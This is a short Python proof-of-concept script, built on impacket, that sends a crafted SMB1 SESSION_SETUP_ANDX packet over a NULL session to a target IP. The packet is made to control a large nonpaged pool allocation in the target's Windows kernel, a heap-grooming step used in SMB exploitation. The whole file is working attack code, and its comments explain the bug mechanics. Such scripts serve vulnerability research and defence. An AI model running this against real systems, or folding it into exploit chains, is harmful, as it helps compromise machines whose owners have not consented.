#!/usr/bin/python
from impacket import smb
from mysmb import MYSMB
from struct import pack
import sys

'''
PoC: demonstrates controlling large nonpaged pool allocation with SMB_COM_SESSION_SETUP_ANDX bug

Note: The PoC does not support user authentication
'''


if len(sys.argv) != 2:
	print("{} <ip>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]

conn = MYSMB(target, use_ntlmv2=False)

_, flags2 = conn.get_flags()

# FLAGS2_EXTENDED_SECURITY MUST not be set
flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY

# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
flags2 |= smb.SMB.FLAGS2_UNICODE
conn.set_flags(flags2=flags2)
	
pkt = smb.NewSMBPacket()

sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()
sessionSetup['Parameters']['MaxBufferSize']      = 61440  # can be any value
sessionSetup['Parameters']['MaxMpxCount']        = 2  # can by any value
sessionSetup['Parameters']['VcNumber']           = 2  # any non-zero
sessionSetup['Parameters']['SessionKey']         = 0
sessionSetup['Parameters']['SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
# UnicodePasswordLen field is in Reserved for extended security format.
sessionSetup['Parameters']['Capabilities']       = smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS

# allocate nonpaged pool size 0x15ff (padding 1 byte, AccountName 2 bytes, PrimaryDomain 2 bytes)
sessionSetup['Data'] = pack('<H', 0x1604) + '\x00'*20
pkt.addCommand(sessionSetup)

conn.sendSMB(pkt)
recvPkt = conn.recvSMB()
if recvPkt.getNTStatus() == 0:
	print('SMB1 session setup allocate nonpaged pool success')
	conn.logoff()
else:
	print('SMB1 session setup allocate nonpaged pool failed')

conn.get_socket().close()
